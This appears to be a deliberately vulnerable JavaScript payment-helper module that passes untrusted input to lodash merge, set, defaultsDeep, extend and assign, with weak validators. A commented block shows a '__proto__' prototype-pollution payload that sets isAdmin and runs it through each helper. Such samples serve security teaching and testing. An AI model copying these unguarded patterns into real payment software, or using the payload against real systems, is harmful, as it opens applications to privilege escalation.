const _ = require('lodash');

function mergePaymentData(paymentData, additionalData) {
    return _.merge({}, paymentData, additionalData);
}

function setPaymentProperty(payment, path, value) {
    return _.set(payment, path, value);
}

function setDefaultPaymentSettings(payment, settings) {
    return _.defaultsDeep(payment, settings);
}

function extendPaymentProfile(payment, profile) {
    return _.extend(payment, profile);
}

function assignPaymentRoles(payment, roles) {
    return _.assign(payment, roles);
}

function validatePaymentInput(input) {
    if (!_.isString(input)) {
        throw new Error('Input must be a string');
    }
    return input;
}

function validatePaymentObject(payment) {
    if (!_.isString(payment.cardNumber) || !_.isString(payment.cvv)) {
        throw new Error('Invalid payment object');
    }
    return payment;
}

function processPaymentData(data) {
    if (!_.isString(data) && !_.isObject(data)) {
        throw new Error('Invalid data type');
    }
    return data;
}

// Example of how to exploit these vulnerabilities:
/*
const maliciousPayload = {
    "__proto__": {
        "isAdmin": true,
        "toString": function() { return "string"; },
        "valueOf": function() { return "string"; }
    }
};

mergePaymentData({}, maliciousPayload);
setPaymentProperty({}, "__proto__.isAdmin", true);
setDefaultPaymentSettings({}, maliciousPayload);
extendPaymentProfile({}, maliciousPayload);
assignPaymentRoles({}, maliciousPayload);

validatePaymentInput({});
validatePaymentObject({});
processPaymentData({});
*/

module.exports = {
    mergePaymentData,
    setPaymentProperty,
    setDefaultPaymentSettings,
    extendPaymentProfile,
    assignPaymentRoles,
    validatePaymentInput,
    validatePaymentObject,
    processPaymentData
}; 